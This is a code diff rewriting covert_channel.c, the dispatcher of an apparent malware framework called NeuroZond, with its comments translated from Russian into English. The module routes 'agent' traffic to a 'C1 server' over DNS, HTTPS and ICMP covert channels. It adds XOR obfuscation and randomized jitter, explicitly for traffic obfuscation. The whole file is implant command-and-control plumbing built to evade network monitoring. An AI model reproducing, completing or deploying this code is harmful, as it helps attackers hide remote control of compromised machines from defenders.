@@ -1,282 +1,219 @@
 /**
  * @file covert_channel.c
- * @brief Основная реализация модуля скрытых коммуникационных каналов
+ * @brief Implementation of the covert channel communication module
+ * @author iamtomasanderson@gmail.com
+ * @date 2023-08-15
  *
- * Этот файл содержит реализацию основного интерфейса для работы со 
- * скрытыми коммуникационными каналами (DNS, HTTPS, ICMP)
- *
- * @author NeuroZond Team
- * @date 2025-04-28
+ * This module provides functionality for establishing and managing covert
+ * communication channels between NeuroZond agents and the C1 server.
  */
 
-#include <stdio.h>
+#include "covert_channel.h"
 #include <stdlib.h>
 #include <string.h>
 #include <time.h>
 
-#include "covert_channel.h"
+// Function pointers for different channel types
+static covert_channel_init_func channel_init_funcs[CHANNEL_TYPE_MAX] = {NULL};
+static covert_channel_connect_func channel_connect_funcs[CHANNEL_TYPE_MAX] = {NULL};
+static covert_channel_send_func channel_send_funcs[CHANNEL_TYPE_MAX] = {NULL};
+static covert_channel_receive_func channel_receive_funcs[CHANNEL_TYPE_MAX] = {NULL};
+static covert_channel_set_jitter_func channel_set_jitter_funcs[CHANNEL_TYPE_MAX] = {NULL};
+static covert_channel_cleanup_func channel_cleanup_funcs[CHANNEL_TYPE_MAX] = {NULL};
 
-/* Глобальные обработчики для различных типов каналов */
-static CovertChannelHandler dns_handler;
-static CovertChannelHandler https_handler;
-static CovertChannelHandler icmp_handler;
-static int handlers_registered = 0;
+// Forward declarations for channel initialization
+extern int dns_channel_init(void** handle, const char* server_addr, void* config);
+extern int dns_channel_connect(void* handle);
+extern int dns_channel_send(void* handle, const uint8_t* data, size_t data_len);
+extern int dns_channel_receive(void* handle, uint8_t* buffer, size_t buffer_size, size_t* bytes_received);
+extern int dns_channel_set_jitter(void* handle, uint32_t min_delay_ms, uint32_t max_delay_ms);
+extern int dns_channel_cleanup(void* handle);
 
-/* Прототипы функций для регистрации обработчиков */
-extern void register_dns_channel_handler(CovertChannelHandler *handler);
-extern void register_https_channel_handler(CovertChannelHandler *handler);
-extern void register_icmp_channel_handler(CovertChannelHandler *handler);
+extern int https_channel_init(void** handle, const char* server_addr, void* config);
+extern int https_channel_connect(void* handle);
+extern int https_channel_send(void* handle, const uint8_t* data, size_t data_len);
+extern int https_channel_receive(void* handle, uint8_t* buffer, size_t buffer_size, size_t* bytes_received);
+extern int https_channel_set_jitter(void* handle, uint32_t min_delay_ms, uint32_t max_delay_ms);
+extern int https_channel_cleanup(void* handle);
 
-/**
- * @brief Регистрирует все доступные обработчики каналов
- */
-static void register_all_handlers(void) {
-    if (handlers_registered) {
-        return;
-    }
+extern int icmp_channel_init(void** handle, const char* server_addr, void* config);
+extern int icmp_channel_connect(void* handle);
+extern int icmp_channel_send(void* handle, const uint8_t* data, size_t data_len);
+extern int icmp_channel_receive(void* handle, uint8_t* buffer, size_t buffer_size, size_t* bytes_received);
+extern int icmp_channel_set_jitter(void* handle, uint32_t min_delay_ms, uint32_t max_delay_ms);
+extern int icmp_channel_cleanup(void* handle);
+
+// Initialize the covert channel module
+int covert_channel_module_init(void) {
+    // Register DNS channel handlers
+    channel_init_funcs[CHANNEL_TYPE_DNS] = dns_channel_init;
+    channel_connect_funcs[CHANNEL_TYPE_DNS] = dns_channel_connect;
+    channel_send_funcs[CHANNEL_TYPE_DNS] = dns_channel_send;
+    channel_receive_funcs[CHANNEL_TYPE_DNS] = dns_channel_receive;
+    channel_set_jitter_funcs[CHANNEL_TYPE_DNS] = dns_channel_set_jitter;
+    channel_cleanup_funcs[CHANNEL_TYPE_DNS] = dns_channel_cleanup;
     
-    /* Регистрация обработчиков для различных типов каналов */
-    memset(&dns_handler, 0, sizeof(dns_handler));
-    memset(&https_handler, 0, sizeof(https_handler));
-    memset(&icmp_handler, 0, sizeof(icmp_handler));
+    // Register HTTPS channel handlers
+    channel_init_funcs[CHANNEL_TYPE_HTTPS] = https_channel_init;
+    channel_connect_funcs[CHANNEL_TYPE_HTTPS] = https_channel_connect;
+    channel_send_funcs[CHANNEL_TYPE_HTTPS] = https_channel_send;
+    channel_receive_funcs[CHANNEL_TYPE_HTTPS] = https_channel_receive;
+    channel_set_jitter_funcs[CHANNEL_TYPE_HTTPS] = https_channel_set_jitter;
+    channel_cleanup_funcs[CHANNEL_TYPE_HTTPS] = https_channel_cleanup;
     
-    register_dns_channel_handler(&dns_handler);
-    register_https_channel_handler(&https_handler);
-    register_icmp_channel_handler(&icmp_handler);
+    // Register ICMP channel handlers
+    channel_init_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_init;
+    channel_connect_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_connect;
+    channel_send_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_send;
+    channel_receive_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_receive;
+    channel_set_jitter_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_set_jitter;
+    channel_cleanup_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_cleanup;
     
-    /* Инициализация генератора случайных чисел */
+    // Initialize random seed for jitter functions
     srand((unsigned int)time(NULL));
     
-    handlers_registered = 1;
+    return 0;
 }
 
-/**
- * @brief Возвращает обработчик для указанного типа канала
- * 
- * @param channel_type Тип канала 
- * @return Указатель на обработчик или NULL, если тип не поддерживается
- */
-static CovertChannelHandler *get_handler_for_type(int channel_type) {
-    switch (channel_type) {
-        case COVERT_CHANNEL_TYPE_DNS:
-            return &dns_handler;
-            
-        case COVERT_CHANNEL_TYPE_HTTPS:
-            return &https_handler;
-            
-        case COVERT_CHANNEL_TYPE_ICMP:
-            return &icmp_handler;
-            
-        default:
-            return NULL;
+int covert_channel_init(covert_channel_handle_t* handle, enum CovertChannelType channel_type, 
+                        const char* server_addr, void* config) {
+    if (!handle || !server_addr || channel_type >= CHANNEL_TYPE_MAX) {
+        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
     }
+    
+    // Check if the handler for this channel type is registered
+    if (channel_init_funcs[channel_type] == NULL) {
+        return COVERT_CHANNEL_ERROR_UNSUPPORTED_CHANNEL;
+    }
+    
+    // Allocate memory for the handle
+    *handle = (covert_channel_handle_t)malloc(sizeof(struct covert_channel_handle_s));
+    if (*handle == NULL) {
+        return COVERT_CHANNEL_ERROR_MEMORY;
+    }
+    
+    // Initialize handle
+    (*handle)->channel_type = channel_type;
+    (*handle)->internal_handle = NULL;
+    
+    // Call the specific channel initialization function
+    int result = channel_init_funcs[channel_type](&((*handle)->internal_handle), server_addr, config);
+    if (result != 0) {
+        free(*handle);
+        *handle = NULL;
+        return result;
+    }
+    
+    return 0;
 }
 
-/**
- * @brief Инициализирует скрытый канал коммуникации с указанной конфигурацией
- * 
- * @param config Конфигурация канала
- * @return Дескриптор канала или NULL при ошибке
- */
-void *covert_channel_init(const CovertChannelConfig *config) {
-    if (!config) {
-        return NULL;
+int covert_channel_connect(covert_channel_handle_t handle) {
+    if (!handle || !handle->internal_handle) {
+        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
     }
     
-    /* Регистрируем обработчики при первом вызове */
-    register_all_handlers();
-    
-    /* Получаем обработчик для указанного типа канала */
-    CovertChannelHandler *handler = get_handler_for_type(config->channel_type);
-    if (!handler || !handler->init) {
-        return NULL;
+    if (handle->channel_type >= CHANNEL_TYPE_MAX || channel_connect_funcs[handle->channel_type] == NULL) {
+        return COVERT_CHANNEL_ERROR_UNSUPPORTED_CHANNEL;
     }
     
-    /* Инициализируем канал с помощью специфического обработчика */
-    return handler->init(config);
+    return channel_connect_funcs[handle->channel_type](handle->internal_handle);
 }
 
-/**
- * @brief Устанавливает соединение через скрытый канал
- * 
- * @param channel Дескриптор канала
- * @return Код статуса операции
- */
-int covert_channel_connect(void *channel) {
-    if (!channel) {
-        return COVERT_CHANNEL_ERROR;
+int covert_channel_send(covert_channel_handle_t handle, const uint8_t* data, size_t data_len) {
+    if (!handle || !handle->internal_handle || !data || data_len == 0) {
+        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
     }
     
-    /* Получаем тип канала из его внутренней структуры */
-    int channel_type = *((int *)channel);
-    
-    /* Получаем обработчик для указанного типа канала */
-    CovertChannelHandler *handler = get_handler_for_type(channel_type);
-    if (!handler || !handler->connect) {
-        return COVERT_CHANNEL_ERROR;
+    if (handle->channel_type >= CHANNEL_TYPE_MAX || channel_send_funcs[handle->channel_type] == NULL) {
+        return COVERT_CHANNEL_ERROR_UNSUPPORTED_CHANNEL;
     }
     
-    /* Устанавливаем соединение с помощью специфического обработчика */
-    return handler->connect(channel);
+    return channel_send_funcs[handle->channel_type](handle->internal_handle, data, data_len);
 }
 
-/**
- * @brief Отправляет данные через скрытый канал
- * 
- * @param channel Дескриптор канала
- * @param data Указатель на данные
- * @param data_len Длина данных
- * @return Количество отправленных байт или код ошибки
- */
-int covert_channel_send(void *channel, const unsigned char *data, int data_len) {
-    if (!channel || !data || data_len <= 0) {
-        return COVERT_CHANNEL_ERROR;
+int covert_channel_receive(covert_channel_handle_t handle, uint8_t* buffer, size_t buffer_size, 
+                           size_t* bytes_received) {
+    if (!handle || !handle->internal_handle || !buffer || buffer_size == 0 || !bytes_received) {
+        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
     }
     
-    /* Получаем тип канала из его внутренней структуры */
-    int channel_type = *((int *)channel);
-    
-    /* Получаем обработчик для указанного типа канала */
-    CovertChannelHandler *handler = get_handler_for_type(channel_type);
-    if (!handler || !handler->send) {
-        return COVERT_CHANNEL_ERROR;
+    if (handle->channel_type >= CHANNEL_TYPE_MAX || channel_receive_funcs[handle->channel_type] == NULL) {
+        return COVERT_CHANNEL_ERROR_UNSUPPORTED_CHANNEL;
     }
     
-    /* Отправляем данные с помощью специфического обработчика */
-    return handler->send(channel, data, data_len);
+    return channel_receive_funcs[handle->channel_type](handle->internal_handle, buffer, buffer_size, bytes_received);
 }
 
-/**
- * @brief Получает данные через скрытый канал
- * 
- * @param channel Дескриптор канала
- * @param buffer Буфер для получаемых данных
- * @param buffer_len Размер буфера
- * @return Количество полученных байт или код ошибки
- */
-int covert_channel_receive(void *channel, unsigned char *buffer, int buffer_len) {
-    if (!channel || !buffer || buffer_len <= 0) {
-        return COVERT_CHANNEL_ERROR;
+int covert_channel_set_jitter(covert_channel_handle_t handle, uint32_t min_delay_ms, uint32_t max_delay_ms) {
+    if (!handle || !handle->internal_handle || min_delay_ms > max_delay_ms) {
+        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
     }
     
-    /* Получаем тип канала из его внутренней структуры */
-    int channel_type = *((int *)channel);
-    
-    /* Получаем обработчик для указанного типа канала */
-    CovertChannelHandler *handler = get_handler_for_type(channel_type);
-    if (!handler || !handler->receive) {
-        return COVERT_CHANNEL_ERROR;
+    if (handle->channel_type >= CHANNEL_TYPE_MAX || channel_set_jitter_funcs[handle->channel_type] == NULL) {
+        return COVERT_CHANNEL_ERROR_UNSUPPORTED_CHANNEL;
     }
     
-    /* Получаем данные с помощью специфического обработчика */
-    return handler->receive(channel, buffer, buffer_len);
+    return channel_set_jitter_funcs[handle->channel_type](handle->internal_handle, min_delay_ms, max_delay_ms);
 }
 
-/**
- * @brief Проверяет, установлено ли соединение через скрытый канал
- * 
- * @param channel Дескриптор канала
- * @return Ненулевое значение, если соединение установлено, иначе 0
- */
-int covert_channel_is_connected(void *channel) {
-    if (!channel) {
-        return 0;
+int covert_channel_cleanup(covert_channel_handle_t handle) {
+    if (!handle) {
+        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
     }
     
-    /* Получаем тип канала из его внутренней структуры */
-    int channel_type = *((int *)channel);
+    int result = 0;
     
-    /* Получаем обработчик для указанного типа канала */
-    CovertChannelHandler *handler = get_handler_for_type(channel_type);
-    if (!handler || !handler->is_connected) {
-        return 0;
+    if (handle->internal_handle && 
+        handle->channel_type < CHANNEL_TYPE_MAX && 
+        channel_cleanup_funcs[handle->channel_type] != NULL) {
+        
+        result = channel_cleanup_funcs[handle->channel_type](handle->internal_handle);
     }
     
-    /* Проверяем соединение с помощью специфического обработчика */
-    return handler->is_connected(channel);
+    free(handle);
+    return result;
 }
 
-/**
- * @brief Устанавливает параметры джиттера для канала
- * 
- * @param channel Дескриптор канала
- * @param min_jitter Минимальный джиттер в мс
- * @param max_jitter Максимальный джиттер в мс
- */
-void covert_channel_set_jitter(void *channel, int min_jitter, int max_jitter) {
-    if (!channel) {
+// Helper function to apply XOR encryption to data
+int covert_channel_encrypt_xor(uint8_t* data, size_t data_len, const uint8_t* key, size_t key_len) {
+    if (!data || !key || data_len == 0 || key_len == 0) {
+        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
+    }
+    
+    for (size_t i = 0; i < data_len; i++) {
+        data[i] ^= key[i % key_len];
+    }
+    
+    return 0;
+}
+
+// Helper function to decrypt XOR encrypted data
+int covert_channel_decrypt_xor(uint8_t* data, size_t data_len, const uint8_t* key, size_t key_len) {
+    // XOR encryption and decryption are the same operation
+    return covert_channel_encrypt_xor(data, data_len, key, key_len);
+}
+
+// Helper function to apply randomized delay for traffic obfuscation
+void covert_channel_apply_jitter(uint32_t min_delay_ms, uint32_t max_delay_ms) {
+    if (min_delay_ms == max_delay_ms) {
+        if (min_delay_ms > 0) {
+            // Sleep for the exact time
+#ifdef _WIN32
+            Sleep(min_delay_ms);
+#else
+            usleep(min_delay_ms * 1000);
+#endif
+        }
         return;
     }
     
-    /* Получаем тип канала из его внутренней структуры */
-    int channel_type = *((int *)channel);
+    // Generate random delay within the specified range
+    uint32_t delay = min_delay_ms + (rand() % (max_delay_ms - min_delay_ms + 1));
     
-    /* Получаем обработчик для указанного типа канала */
-    CovertChannelHandler *handler = get_handler_for_type(channel_type);
-    if (!handler || !handler->set_jitter) {
-        return;
-    }
-    
-    /* Устанавливаем джиттер с помощью специфического обработчика */
-    handler->set_jitter(channel, min_jitter, max_jitter);
-}
-
-/**
- * @brief Освобождает ресурсы, занятые скрытым каналом
- * 
- * @param channel Дескриптор канала
- */
-void covert_channel_cleanup(void *channel) {
-    if (!channel) {
-        return;
-    }
-    
-    /* Получаем тип канала из его внутренней структуры */
-    int channel_type = *((int *)channel);
-    
-    /* Получаем обработчик для указанного типа канала */
-    CovertChannelHandler *handler = get_handler_for_type(channel_type);
-    if (!handler || !handler->cleanup) {
-        return;
-    }
-    
-    /* Освобождаем ресурсы с помощью специфического обработчика */
-    handler->cleanup(channel);
-}
-
-/**
- * @brief Применяет шум к времени задержки
- * 
- * @param min_jitter Минимальный джиттер в мс
- * @param max_jitter Максимальный джиттер в мс
- * @return Случайное время задержки в миллисекундах
- */
-int covert_channel_apply_jitter(int min_jitter, int max_jitter) {
-    if (min_jitter < 0) min_jitter = 0;
-    if (max_jitter < min_jitter) max_jitter = min_jitter;
-    
-    /* Если min и max равны, возвращаем константное значение */
-    if (min_jitter == max_jitter) {
-        return min_jitter;
-    }
-    
-    /* Генерируем случайное значение в диапазоне [min_jitter, max_jitter] */
-    return min_jitter + (rand() % (max_jitter - min_jitter + 1));
-}
-
-/**
- * @brief Выполняет задержку с применением джиттера
- * 
- * @param min_jitter Минимальный джиттер в мс
- * @param max_jitter Максимальный джиттер в мс
- */
-void covert_channel_jitter_delay(int min_jitter, int max_jitter) {
-    int delay_ms = covert_channel_apply_jitter(min_jitter, max_jitter);
-    
-    /* Выполняем задержку */
-    struct timespec ts;
-    ts.tv_sec = delay_ms / 1000;
-    ts.tv_nsec = (delay_ms % 1000) * 1000000L;
-    
-    nanosleep(&ts, NULL);
+    // Sleep for the calculated time
+#ifdef _WIN32
+    Sleep(delay);
+#else
+    usleep(delay * 1000);
+#endif
 } 
